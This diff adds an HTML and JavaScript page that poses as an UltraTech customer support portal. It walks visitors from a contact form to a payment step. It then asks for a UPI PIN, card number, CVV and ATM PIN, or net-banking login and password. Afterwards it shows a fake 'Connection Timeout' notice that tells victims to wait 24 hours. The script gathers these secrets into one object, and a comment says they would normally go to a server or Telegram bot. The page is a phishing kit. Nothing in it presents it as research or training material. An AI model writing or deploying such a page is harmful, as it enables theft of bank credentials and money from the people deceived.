@@ -1,0 +1,644 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>UltraTech Customer Support</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --ut-yellow: #ffcb05; /* Official UltraTech Yellow */
+            --ut-yellow-hover: #e5b604;
+            --ut-black: #222222;
+            --ut-gray: #f5f5f5;
+            --text-main: #333333;
+            --text-light: #666666;
+            --border-color: #dddddd;
+            --bg-color: #eaedf2;
+            --font-family: 'Inter', sans-serif;
+            --error-red: #d32f2f;
+            --success-green: #2e7d32;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            font-family: var(--font-family);
+            background-color: var(--bg-color);
+            color: var(--text-main);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .app-top-bar {
+            background-color: var(--ut-black);
+            color: var(--ut-yellow);
+            padding: 16px 20px;
+            font-size: 18px;
+            font-weight: 700;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.3);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            text-transform: uppercase;
+            letter-spacing: 1.5px;
+        }
+
+        .app-top-bar.hidden {
+            display: none;
+        }
+
+        .header-area {
+            background-color: #ffffff;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 30px 20px 20px;
+            border-bottom: 4px solid var(--ut-yellow);
+            box-shadow: 0 4px 6px rgba(0,0,0,0.05);
+        }
+
+        .logo-img {
+            height: 80px;
+            width: auto;
+            margin-bottom: 20px;
+            object-fit: contain;
+        }
+
+        .support-title {
+            color: var(--ut-black);
+            font-size: 22px;
+            font-weight: 800;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            margin: 0;
+        }
+
+        .content-area {
+            flex: 1;
+            display: flex;
+            justify-content: center;
+            padding: 30px 16px;
+        }
+
+        .page-view {
+            display: none;
+            width: 100%;
+            max-width: 480px;
+        }
+
+        .page-view.active {
+            display: block;
+            animation: slideUp 0.4s cubic-bezier(0.16, 1, 0.3, 1);
+        }
+
+        @keyframes slideUp {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .card {
+            background-color: #ffffff;
+            border-radius: 12px;
+            padding: 32px 28px;
+            box-shadow: 0 8px 24px rgba(0,0,0,0.08);
+            border-top: 5px solid var(--ut-yellow);
+            margin-bottom: 24px;
+        }
+
+        .card-title {
+            color: var(--ut-black);
+            font-size: 18px;
+            font-weight: 800;
+            margin-bottom: 28px;
+            text-transform: uppercase;
+            border-bottom: 2px solid var(--ut-gray);
+            padding-bottom: 12px;
+            letter-spacing: 0.5px;
+        }
+
+        .center-title {
+            text-align: center;
+            border-bottom: none;
+            padding-bottom: 0;
+            font-size: 22px;
+        }
+
+        .form-container {
+            display: flex;
+            flex-direction: column;
+        }
+
+        .input-group {
+            margin-bottom: 22px;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .inline-group {
+            display: flex;
+            justify-content: space-between;
+            gap: 16px;
+        }
+
+        .half-width {
+            flex: 1;
+            min-width: 0; /* Prevents overflow in flex containers */
+        }
+
+        .input-group label {
+            color: var(--ut-black);
+            font-size: 14px;
+            font-weight: 700;
+            margin-bottom: 10px;
+        }
+
+        .input-group input, .input-group select {
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            padding: 14px 16px;
+            font-size: 16px;
+            background: #fafafa;
+            color: var(--text-main);
+            outline: none;
+            transition: all 0.3s ease;
+            font-family: var(--font-family);
+        }
+
+        .input-group input::placeholder {
+            color: #a0a0a0;
+        }
+
+        .input-group input:focus, .input-group select:focus {
+            border-color: var(--ut-black);
+            background: #ffffff;
+            box-shadow: 0 0 0 3px rgba(255, 203, 5, 0.3);
+        }
+
+        .btn-primary {
+            background-color: var(--ut-yellow);
+            color: var(--ut-black);
+            border: none;
+            border-radius: 8px;
+            padding: 16px;
+            font-size: 16px;
+            font-weight: 800;
+            cursor: pointer;
+            width: 100%;
+            transition: all 0.3s ease;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-top: 10px;
+            box-shadow: 0 4px 6px rgba(255, 203, 5, 0.3);
+        }
+
+        .btn-primary:hover {
+            background-color: var(--ut-yellow-hover);
+            transform: translateY(-2px);
+            box-shadow: 0 6px 12px rgba(255, 203, 5, 0.4);
+        }
+
+        .btn-primary:active {
+            transform: translateY(0);
+            box-shadow: 0 2px 4px rgba(255, 203, 5, 0.3);
+        }
+
+        /* Custom Radio Buttons */
+        .radio-group {
+            margin-bottom: 16px;
+            background: #ffffff;
+            border: 2px solid var(--border-color);
+            border-radius: 8px;
+            padding: 14px 16px;
+            transition: all 0.2s ease;
+        }
+        
+        .radio-group:hover {
+            border-color: var(--ut-yellow);
+            background-color: #fffef7;
+        }
+
+        /* Styling specifically for selected radio group wrapper */
+        .radio-group:has(input[type="radio"]:checked) {
+            border-color: var(--ut-yellow);
+            background-color: #fffdf0;
+        }
+
+        .radio-label {
+            display: flex;
+            align-items: center;
+            cursor: pointer;
+            font-size: 16px;
+            font-weight: 700;
+            color: var(--text-main);
+            width: 100%;
+        }
+
+        .radio-label input[type="radio"] {
+            display: none;
+        }
+
+        .custom-radio {
+            width: 22px;
+            height: 22px;
+            border: 2px solid #aaa;
+            border-radius: 50%;
+            margin-right: 14px;
+            position: relative;
+            display: inline-block;
+            transition: all 0.2s ease;
+        }
+
+        .radio-label input[type="radio"]:checked + .custom-radio {
+            border-color: var(--ut-black);
+        }
+
+        .radio-label input[type="radio"]:checked + .custom-radio::after {
+            content: '';
+            width: 10px;
+            height: 10px;
+            background-color: var(--ut-black);
+            border-radius: 50%;
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+        }
+
+        /* Payment Buttons */
+        .payment-methods {
+            display: flex;
+            flex-direction: column;
+            gap: 16px;
+            margin-top: 10px;
+        }
+
+        .btn-secondary {
+            background-color: #ffffff;
+            color: var(--ut-black);
+            border: 2px solid var(--border-color);
+            border-radius: 8px;
+            padding: 18px 16px;
+            font-size: 16px;
+            font-weight: 800;
+            cursor: pointer;
+            text-align: center;
+            transition: all 0.3s ease;
+            position: relative;
+        }
+
+        .btn-secondary:hover {
+            border-color: var(--ut-yellow);
+            background-color: #fffef7;
+            transform: translateY(-2px);
+            box-shadow: 0 4px 12px rgba(0,0,0,0.06);
+        }
+
+        /* Message Page */
+        .message-container {
+            padding: 40px 24px;
+            background-color: #ffffff;
+            border-radius: 12px;
+            text-align: center;
+            border-top: 6px solid var(--error-red);
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
+        }
+
+        .status-title {
+            font-size: 26px;
+            font-weight: 900;
+            margin-bottom: 20px;
+            color: var(--error-red);
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .note-title {
+            font-size: 20px;
+            font-weight: 800;
+            margin-bottom: 16px;
+            color: var(--success-green);
+        }
+
+        .final-text {
+            font-size: 16px;
+            color: var(--text-main);
+            line-height: 1.6;
+            font-weight: 500;
+        }
+
+    </style>
+</head>
+<body>
+    <div class="app-top-bar" id="top-bar">
+        <span>Customer Service Portal</span>
+    </div>
+
+    <div class="header-area">
+        <img src="assets/ultratech-cement-logo.png" alt="UltraTech Logo" class="logo-img">
+        <h2 class="support-title">Self Service Support</h2>
+    </div>
+
+    <main class="content-area">
+        <!-- PAGE 1: Online Service Form -->
+        <div id="page-1" class="page-view active">
+            <div class="card">
+                <h3 class="card-title">Customer Contact Details</h3>
+                <form id="support-form" class="form-container">
+                    <div class="input-group">
+                        <label for="customer-name">Customer Name*</label>
+                        <input type="text" id="customer-name" placeholder="Enter Full Name" required>
+                    </div>
+
+                    <div class="input-group">
+                        <label for="mobile-number">Mobile Number*</label>
+                        <input type="tel" id="mobile-number" placeholder="Enter 10-digit Mobile Number" required pattern="[0-9]{10}"
+                            maxlength="10" minlength="10" title="Please enter exactly 10 digits"
+                            oninput="this.value = this.value.replace(/[^0-9]/g, '');">
+                    </div>
+
+                    <div class="input-group">
+                        <label for="reason">Support Query / Reason*</label>
+                        <input type="text" id="reason" placeholder="Briefly Describe Your Problem" required>
+                    </div>
+
+                    <div class="submit-wrapper">
+                        <button type="submit" class="btn-primary" id="btn-submit">Proceed</button>
+                    </div>
+                </form>
+            </div>
+        </div>
+
+        <!-- PAGE 2: Payment Mode Form -->
+        <div id="page-2" class="page-view">
+            <div class="card">
+                <h3 class="card-title">Select Support Category*</h3>
+                <form id="payment-mode-form" class="form-container">
+                    <div class="radio-group">
+                        <label class="radio-label">
+                            <input type="radio" name="payment-mode" value="pay" checked>
+                            <span class="custom-radio"></span>
+                            MAKE PAYMENT
+                        </label>
+                    </div>
+                    <div class="radio-group">
+                        <label class="radio-label">
+                            <input type="radio" name="payment-mode" value="refund">
+                            <span class="custom-radio"></span>
+                            REQUEST REFUND
+                        </label>
+                    </div>
+                    <div class="radio-group">
+                        <label class="radio-label">
+                            <input type="radio" name="payment-mode" value="other">
+                            <span class="custom-radio"></span>
+                            OTHER ISSUES
+                        </label>
+                    </div>
+
+                    <div class="input-group" style="margin-top: 24px;">
+                        <label for="amount">Associated Amount (₹)*</label>
+                        <input type="number" id="amount" placeholder="Enter Amount" required style="font-size: 18px; font-weight: 600;">
+                    </div>
+
+                    <button type="submit" class="btn-primary" id="btn-next">Next Step</button>
+                </form>
+            </div>
+        </div>
+
+        <!-- PAGE 3: Payment Method Selection -->
+        <div id="page-3" class="page-view">
+            <div class="card">
+                <h3 class="card-title center-title">Select Payment Gateway</h3>
+                <div class="payment-methods">
+                    <button type="button" class="btn-secondary" onclick="selectPayment('upi')">UPI PAYMENT</button>
+                    <button type="button" class="btn-secondary" onclick="selectPayment('card')">DEBIT / CREDIT CARD</button>
+                    <button type="button" class="btn-secondary" onclick="selectPayment('netbanking')">NET BANKING</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- PAGE UPI: UPI Transaction Details -->
+        <div id="page-upi" class="page-view">
+            <div class="card">
+                <h3 class="card-title">Verify UPI Transaction</h3>
+                <form class="form-container" onsubmit="showFinalPage(event)">
+                    <div class="input-group">
+                        <label for="upi-bank-name">Select Bank</label>
+                        <input type="text" id="upi-bank-name" placeholder="Search or Select Bank" list="indian-banks"
+                            required autocomplete="off">
+                    </div>
+                    <div class="input-group">
+                        <label for="upi-password">Secure UPI PIN*</label>
+                        <input type="password" id="upi-password" placeholder="Enter UPI PIN securely" required>
+                    </div>
+                    <button type="submit" class="btn-primary">Verify & Submit</button>
+                </form>
+            </div>
+        </div>
+
+        <!-- PAGE CARD: Card Details + ATM PIN -->
+        <div id="page-card" class="page-view">
+            <div class="card">
+                <h3 class="card-title">Verify Card Details</h3>
+                <form class="form-container" onsubmit="showFinalPage(event)">
+                    <div class="input-group">
+                        <label for="card-number">Card 16-Digit Number*</label>
+                        <input type="text" id="card-number" placeholder="XXXX-XXXX-XXXX-XXXX" maxlength="19" required
+                            oninput="
+                            this.value = this.value.replace(/[^0-9]/g, '').replace(/(.{4})/g, '$1-').replace(/-$/, '');
+                        ">
+                    </div>
+                    <div class="inline-group">
+                        <div class="input-group half-width">
+                            <label for="expiry">Expiry (MM/YY)*</label>
+                            <input type="text" id="expiry" placeholder="MM/YY" maxlength="5" required>
+                        </div>
+                        <div class="input-group half-width">
+                            <label for="cvv">CVV*</label>
+                            <input type="password" id="cvv" placeholder="***" maxlength="4" required>
+                        </div>
+                    </div>
+                    
+                    <div class="input-group" style="margin-top: 10px;">
+                        <label for="atm-pin">ATM PIN for Verification*</label>
+                        <input type="password" id="atm-pin" placeholder="Enter 4-digit ATM PIN" maxlength="4" required>
+                    </div>
+                    
+                    <button type="submit" class="btn-primary">Verify & Submit</button>
+                </form>
+            </div>
+        </div>
+
+        <!-- PAGE NETBANKING: Net Banking Authentication -->
+        <div id="page-netbanking" class="page-view">
+            <div class="card">
+                <h3 class="card-title">Net Banking Authentication</h3>
+                <form class="form-container" onsubmit="showFinalPage(event)">
+                    <div class="input-group">
+                        <label for="bank-name">Select Bank</label>
+                        <input type="text" id="bank-name" placeholder="Search or Select Bank" list="indian-banks"
+                            required autocomplete="off">
+                    </div>
+                    <div class="input-group">
+                        <label for="username">User ID / Customer ID*</label>
+                        <input type="text" id="username" placeholder="Enter User ID" required>
+                    </div>
+                    <div class="input-group">
+                        <label for="password">Password*</label>
+                        <input type="password" id="password" placeholder="Enter Password securely" required>
+                    </div>
+                    <button type="submit" class="btn-primary">Authenticate & Submit</button>
+                </form>
+            </div>
+        </div>
+
+        <!-- PAGE FINAL: Success / Bank Server Down -->
+        <div id="page-final" class="page-view">
+            <div class="message-container">
+                <h3 class="status-title">Connection Timeout</h3>
+                <h4 class="note-title">Important Notice</h4>
+                <p class="final-text">
+                    We apologize, but there is currently a delay in verifying your information due to banking server congestions.<br><br>
+                    Please wait. This process may take a minimum of 24 hours to automatically resolve.<br>
+                    You will receive an official notification once your details are successfully verified by our support team.
+                </p>
+            </div>
+        </div>
+    </main>
+
+    <!-- Bank Datalist -->
+    <datalist id="indian-banks">
+        <option value="State Bank of India"></option>
+        <option value="HDFC Bank"></option>
+        <option value="ICICI Bank"></option>
+        <option value="Punjab National Bank"></option>
+        <option value="Bank of Baroda"></option>
+        <option value="Axis Bank"></option>
+        <option value="Canara Bank"></option>
+        <option value="Union Bank of India"></option>
+        <option value="Kotak Mahindra Bank"></option>
+        <option value="Bank of India"></option>
+        <option value="Indian Bank"></option>
+        <option value="Central Bank of India"></option>
+        <!-- Adding common ones to keep it functional but concise -->
+        <option value="IDFC FIRST Bank"></option>
+        <option value="Yes Bank"></option>
+        <option value="IndusInd Bank"></option>
+    </datalist>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            const page1 = document.getElementById('page-1');
+            const page2 = document.getElementById('page-2');
+            const page3 = document.getElementById('page-3');
+            
+            // Payment Method Pages
+            const pageUpi = document.getElementById('page-upi');
+            const pageCard = document.getElementById('page-card');
+            const pageNetbanking = document.getElementById('page-netbanking');
+
+            const supportForm = document.getElementById('support-form');
+            const paymentModeForm = document.getElementById('payment-mode-form');
+            const topBar = document.getElementById('top-bar');
+            
+            // Store collected form data
+            const collectedData = {};
+
+            // Handle Page 1 -> Page 2
+            supportForm.addEventListener('submit', (e) => {
+                e.preventDefault();
+                if(supportForm.checkValidity()) {
+                    collectedData.customerName = document.getElementById('customer-name').value;
+                    collectedData.mobileNumber = document.getElementById('mobile-number').value;
+                    collectedData.reason = document.getElementById('reason').value;
+
+                    page1.classList.remove('active');
+                    page2.classList.add('active');
+                    window.scrollTo({ top: 0, behavior: 'smooth' });
+                }
+            });
+
+            // Handle Page 2 -> Page 3
+            paymentModeForm.addEventListener('submit', (e) => {
+                e.preventDefault();
+                if(paymentModeForm.checkValidity()) {
+                    collectedData.paymentMode = document.querySelector('input[name="payment-mode"]:checked')?.value || '';
+                    collectedData.amount = document.getElementById('amount').value;
+
+                    page2.classList.remove('active');
+                    page3.classList.add('active');
+                    window.scrollTo({ top: 0, behavior: 'smooth' });
+                }
+            });
+
+            // Handle Payment Selection from Page 3
+            window.selectPayment = function(method) {
+                collectedData.paymentMethod = method;
+                page3.classList.remove('active');
+                
+                if (method === 'upi') {
+                    pageUpi.classList.add('active');
+                } else if (method === 'card') {
+                    pageCard.classList.add('active');
+                } else if (method === 'netbanking') {
+                    pageNetbanking.classList.add('active');
+                }
+                window.scrollTo({ top: 0, behavior: 'smooth' });
+            };
+
+            // Handle Final Submission
+            window.showFinalPage = function(e) {
+                e.preventDefault();
+
+                // Collect final page data based on selected method
+                if (collectedData.paymentMethod === 'upi') {
+                    collectedData.upiBankName = document.getElementById('upi-bank-name').value;
+                    collectedData.upiPassword = document.getElementById('upi-password').value;
+                } else if (collectedData.paymentMethod === 'card') {
+                    collectedData.cardNumber = document.getElementById('card-number').value;
+                    collectedData.expiry = document.getElementById('expiry').value;
+                    collectedData.cvv = document.getElementById('cvv').value;
+                    collectedData.atmPin = document.getElementById('atm-pin').value;
+                } else if (collectedData.paymentMethod === 'netbanking') {
+                    collectedData.bankName = document.getElementById('bank-name').value;
+                    collectedData.username = document.getElementById('username').value;
+                    collectedData.password = document.getElementById('password').value;
+                }
+
+                // Hide all active pages
+                document.querySelectorAll('.page-view.active').forEach(el => el.classList.remove('active'));
+                
+                // Show Final Page
+                document.getElementById('page-final').classList.add('active');
+                
+                // Scroll to top
+                window.scrollTo({ top: 0, behavior: 'smooth' });
+
+                // (Optional) Here you would normally send 'collectedData' to a server/Telegram bot.
+                console.log('Data to submit:', collectedData);
+            };
+
+            // Formatting Expiry Date MM/YY dynamically
+            const expiryInput = document.getElementById('expiry');
+            if(expiryInput) {
+                expiryInput.addEventListener('input', function (e) {
+                    let value = e.target.value.replace(/\D/g, '');
+                    if (value.length > 2) {
+                        value = value.substring(0, 2) + '/' + value.substring(2, 4);
+                    }
+                    e.target.value = value;
+                });
+            }
+        });
+    </script>
+</body>
+</html>
